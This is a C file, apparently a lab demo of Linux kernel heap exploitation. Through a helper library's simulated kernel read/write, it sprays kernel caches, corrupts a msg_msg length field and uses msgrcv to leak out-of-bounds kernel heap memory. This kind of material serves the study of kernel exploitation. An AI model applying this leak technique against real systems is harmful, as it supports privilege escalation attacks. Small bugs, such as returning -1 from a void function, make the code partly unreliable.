#include "./lib/krwx.h"
#include <sys/msg.h>
#include <sys/shm.h>
#include <inttypes.h>

struct msg_msg_buf {
    long mtype;     /* message type, must be >0 */
    /* MSG FOLLOWS (dynamic) */
};

void dump_memory(void* start_address, size_t size){
    void* end_address = start_address + size; // also if not padded to 8 it will be fine in the loop condition
    //printf("[D] [read_memory] start_addres: %p\n[D][read_memory] end_address: %p\n", start_address, end_address);
    printf("\n");
    while(start_address < end_address){
        l_print_qword(start_address);
        start_address = start_address + (8 * 2);
    }
}

void spray_shm(int num)
{
    int shmid[4000]     = {0};
    void *shmaddr[4000] = {0};
    for(int i = 0; i < num; i++){
        shmid[i] = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600);
        if (shmid[i]  < 0) return -1;
        shmaddr[i] = (void *)shmat(shmid[i], NULL, SHM_RDONLY);
        if (shmaddr[i] < 0)return -1;
    }
}


int main(){
	// Spray kmalloc-4096
	printf("[*] Spraying kmalloc-4096 and kmalloc-32..\n");
	for(int i=0; i < 1000; i++) kmalloc(4096, GFP_KERNEL);
	for(int i=0; i < 1000; i++) kmalloc(32, GFP_KERNEL);

    
    printf("[*] Allocating a msg_msg struct in kmalloc-4096 + a msg_msgseg (pointed by msg_msg->next) ..\n");
    unsigned long total_len = sizeof(struct msg_msg_buf) + (4096 - 48 - 8) + 20;
    
    int qid = msgget(0x4545, IPC_CREAT | 0666); // 0x4545 is random
    if( qid == -1 ) exit(-1);
    
    struct msg_msg_buf* msg_buf = malloc(total_len);

    msg_buf->mtype = 1;
    // Initializing the msg content with 0x49 (starting after the mtype membre)
    memset((void*) msg_buf + sizeof(struct msg_msg_buf), 0x49, total_len - sizeof(struct msg_msg_buf) );
    
    
    printf("[*] This will cause an allocation in kmalloc-4096 (msg_msg) and one in kmalloc-32 (msg_msgseg)\n");
    void* chunk = kmalloc(4096, GFP_KERNEL);
    kfree(chunk);
    // Sending the msg using msgsnd
    if( msgsnd(qid, msg_buf, total_len, IPC_NOWAIT) == -1 ) exit(-1);
    spray_shm(10);
    printf("[*] Allocating SHM structs in order to be allocated after the kmalloc-32 chunk\n");

    printf("[*] Allocated msg_msg struct: \n");
    read_memory(chunk, 0x40);
    
    printf("[*] Corrupting msg_msg->m_ts (msg length) from the original 4068 to 4200 (132 bytes beyond)\n");
    kwrite64(chunk + 0x18, 4200); // 0x18 => msg_msg.m_ts
    printf("[*] Since it starts reading from the 'main' msg_msg and continues in the second segment, the corruption will cause an Out-Of-Bounds read in the kmalloc-32 chunk\n");

    printf("[*] Allocated msg_msg struct after corruption: \n");
    read_memory(chunk, 0x40);
    
    char* msg_leak = malloc(4096 * 2);
    printf("\n[*] Retrieving msg from msgrcv ..\n");
    if (msgrcv( qid, msg_leak, 0xffff, 1 /* msgtype */, MSG_NOERROR | IPC_NOWAIT ) == -1 ) exit(-1);
    printf("[+] Leaked memory:\n");
    // The leak start from offset 4070
    dump_memory(msg_leak + 4064, 0x50); 

}
